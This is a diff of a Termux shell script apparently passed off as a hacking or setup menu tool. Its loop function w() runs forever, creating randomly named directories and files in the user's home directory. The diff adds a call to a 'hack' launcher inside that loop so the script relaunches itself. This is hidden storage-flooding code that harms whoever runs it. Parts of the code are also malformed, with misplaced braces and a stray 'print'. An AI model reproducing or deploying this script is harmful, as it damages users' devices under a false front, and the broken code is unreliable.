@@ -32,6 +32,7 @@ R() {
 		}
 		w() {
 			while [ true ];do
+			print "wait"
 		cd ~
 		mkdir hdh$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
 		mkdir dHh$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
@@ -41,9 +42,10 @@ R() {
 		mkdir dDJJDdh$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM > /dev/null 2>&1
 		touch $RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM > /dev/null 2>&1
 		touch JX$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM > /dev/null 2>&2
+		hack
 		done
+		}
 	menu () {
-		w
 		bann
 		termux-setup-storage
 		R
@@ -56,15 +58,13 @@ R() {
 		*)menu ;;
 		esac
 		}
-		menu
 		set() {
-			w
 			apt update
-			w
 			apt upgrade
-			apt install python
 			w
+			apt install python
 	apt install figlet
+	cd $PREFIX/bin
 	echo "#!/data/data/com.termux/files/usr/bin/sh" >> hack
 	echo "bash $PREFIX/bin/phone.sh" >> hack
 	chmod 777 hack
@@ -77,6 +77,5 @@ R() {
 	if [ -f hack ];then
 	menu
 	else
-	w
 	set
 	fi
